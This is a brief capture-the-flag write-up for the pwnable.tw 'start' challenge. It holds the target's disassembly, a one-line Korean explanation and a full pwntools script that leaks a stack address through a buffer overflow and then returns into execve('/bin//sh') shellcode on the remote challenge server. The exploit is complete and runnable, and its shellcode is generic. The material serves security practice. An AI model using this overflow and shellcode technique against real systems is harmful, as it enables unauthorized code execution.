# [pwnable.tw] \[PWN] start

### Solution

```assembly
push    esp
push    offset _exit
xor     eax, eax
xor     ebx, ebx
xor     ecx, ecx
xor     edx, edx
push    3A465443h
push    20656874h
push    20747261h
push    74732073h
push    2774654Ch
mov     ecx, esp        ; addr
mov     dl, 14h         ; len
mov     bl, 1           ; fd
mov     al, 4
int     80h             ; LINUX - sys_write
xor     ebx, ebx
mov     dl, 3Ch
mov     al, 3
int     80h             ; LINUX - sys_read
add     esp, 14h
retn
```

assembly로 짜여진 프로그램입니다.

스택의 주소를 leak한 후, 쉘코드를 올리고 쉘을 획득했습니다.

```
from pwn import *

#p = process("./start")
p = remote("chall.pwnable.tw", 10000)
print p.recv()

shellcode = (
"\x31\xc0\x50\x68\x2f\x2f\x73"
"\x68\x68\x2f\x62\x69\x6e\x89"
"\xe3\x89\xc1\x89\xc2\xb0\x0b"
"\xcd\x80\x31\xc0\x40\xcd\x80"
)

payload = "a"*20
payload += p32(0x08048087)
p.send(payload)

leaked = u32(p.recv(4))					# leak stack addr
addr_shellcode = leaked + 20
log.info("leaked = " + hex(leaked))
log.info("addr_shellcode = " + hex(addr_shellcode))

print p.recv()
raw_input()
payload = "a"*20
payload += p32(addr_shellcode)
payload += shellcode
p.send(payload)
p.interactive()
```

